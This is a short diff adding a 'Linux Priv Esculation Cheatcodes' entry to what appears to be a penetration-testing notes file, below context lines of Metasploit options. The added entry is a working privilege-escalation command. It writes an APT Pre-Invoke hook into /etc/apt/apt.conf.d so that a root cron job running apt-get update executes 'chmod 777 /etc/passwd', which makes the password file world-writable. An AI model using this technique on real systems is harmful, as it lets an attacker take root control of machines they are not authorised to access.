@@ -3101,3 +3101,8 @@ run
     set SRVHOST 127.0.0.1
     set version 5
     run -j
+
+# Linux Priv Esculation Cheatcodes
+
+	Write Access to /etc/apt/apt.conf.d, apt-get update run on cronjob by root:
+ 		echo 'APT::Update::Pre-Invoke {"chmod 777 /etc/passwd";}' >> 3update
